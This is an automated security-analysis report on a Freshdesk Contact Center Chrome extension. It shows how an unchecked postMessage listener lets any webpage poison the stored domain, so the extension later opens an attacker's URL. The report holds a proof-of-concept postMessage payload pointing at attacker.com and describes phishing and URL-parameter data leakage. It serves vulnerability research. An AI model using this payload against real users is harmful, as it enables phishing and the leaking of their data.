# CoCo Analysis: lhpooekbhchbjkodlebdmapmmjpoophn

## Summary

- **Overall Assessment:** TRUE POSITIVE
- **Total Sinks Detected:** 1

---

## Sink: cs_window_eventListener_message → chrome_storage_sync_set_sink

**CoCo Trace:**
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/lhpooekbhchbjkodlebdmapmmjpoophn/opgen_generated_files/cs_0.js
Line 470: `window.addEventListener("message", function (event) {...`
Line 471: `if (event.data.type === 'freshcaller_logged_in' && event.data.domain) {...`

**Code:**

```javascript
// Content script (cs_0.js) - Entry point: window.postMessage listener
window.addEventListener("message", function (event) { // Line 470
  if (event.data.type === 'freshcaller_logged_in' && event.data.domain) { // ← attacker-controlled
    chrome.storage.sync.set({ logged_in: true, domain: event.data.domain }); // Line 472: Storage write
  }
  if (event.data.type === 'freshcaller_logged_out' || event.data.type === 'freshcaller_authentication_failed') {
    chrome.storage.sync.get("domain", function (syncData) {
      if (event.data.domain === syncData.domain) {
        chrome.storage.sync.set({ logged_in: false, domain: '' });
        chrome.runtime.sendMessage({ action: 'after_logout' });
      }
    })
  }
});

// Content script - Storage retrieval and message sending (cs_0.js Line 618, 623)
function call(number, e) {
  // ...
  e.preventDefault();
  chrome.runtime.sendMessage({ action: 'open_widget', "number": number }); // Triggers background
}

// Background script - Message handler (bg.js Line 1060-1082)
chrome.runtime.onMessage.addListener(function (request, sender, sendResponse) {
  if (request.action === 'open_widget') {
    if (windowId) {
      chrome.windows.update(windowId, { focused: true, state: "normal" }, function (win) {
        chrome.tabs.sendMessage(tabId, { action: "rewrite_number", number: request.number });
      });
      return;
    }
    openWidget(request.number); // Line 1082: Opens widget with poisoned domain
  }
  // ... other handlers
});

// Background script - openWidget function (bg.js Line 967-1002)
function openWidget(info, tab) {
  let number = '';
  if (numberToCall) {
    number = numberToCall.replace(/ /g, '');
  } else if (info) {
    number = (info.selectionText ? info.selectionText : info).replace(/ /g, '');
  }
  var left = Math.round((screen.width / 2) - (350 / 2));
  var top = Math.round((screen.height / 2) - (528 / 2));
  numberToCall = '';

  if (tabId && windowId) {
    chrome.storage.sync.get("domain", function (data) { // Line 978: Read poisoned domain
      let url = `${data.domain}/widget/?chrome_extension_number=${number}`; // ← attacker controls domain
      chrome.tabs.update(tabId, { url: url }); // Line 981: Navigate to attacker-controlled URL
      chrome.windows.update(windowId, { focused: true });
    });
  } else {
    chrome.storage.sync.get("domain", function (data) { // Line 985: Read poisoned domain
      let url = `${data.domain}/widget/?chrome_extension_number=${number}`; // ← attacker controls domain
      chrome.windows.create({ // Line 988: Open attacker-controlled URL in new window
        url: url,
        type: "popup",
        width: 350,
        height: 528,
        left: left,
        top: top,
        focused: true
      }, (window) => {
        tabId = window.tabs[0].id;
        windowId = window.id;
      });
    });
  }
}

// Background script - Context menu also triggers openWidget (bg.js Line 1039-1055)
chrome.contextMenus.create({
  title: "Call %s via Freshdesk Contact Center",
  contexts: ["link"],
  onclick: openWidget, // User clicking context menu triggers the attack
  id: "freshfone",
  targetUrlPatterns: ["tel:*", "sms:*", "mms:*", "contact:*", "skype:*", "Call-to:*"]
});
```

**Classification:** TRUE POSITIVE

**Attack Vector:** window.postMessage listener in content script (injected on all_urls)

**Attack:**

```javascript
// Attacker webpage sends malicious postMessage
window.postMessage({
  type: 'freshcaller_logged_in',
  domain: 'https://attacker.com'
}, '*');

// Now when user interacts with the extension:
// 1. User clicks a phone number on ANY webpage (extension monitors all pages)
// 2. User right-clicks and selects "Call via Freshdesk Contact Center" from context menu
// 3. Extension opens chrome.windows.create with URL: https://attacker.com/widget/?chrome_extension_number=...
// 4. Attacker-controlled page opens in extension-created window
```

**Impact:**

Complete storage exploitation chain with URL redirection. An attacker can:

1. **Poison storage**: Inject malicious domain into chrome.storage.sync via window.postMessage
2. **Trigger exploitation**: When user interacts with extension (clicks phone number or context menu), the poisoned domain is retrieved
3. **URL redirection**: Extension opens attacker-controlled URL (https://attacker.com/widget/...) using chrome.windows.create or chrome.tabs.update
4. **Phishing/XSS potential**: Attacker's page opens in a context that appears legitimate (extension-created window), enabling phishing attacks or collecting user data passed in the URL parameters

This is a complete attack chain: attacker-controlled data → storage.set → user interaction → storage.get → privileged API (chrome.windows.create/chrome.tabs.update) → attacker-controlled destination.
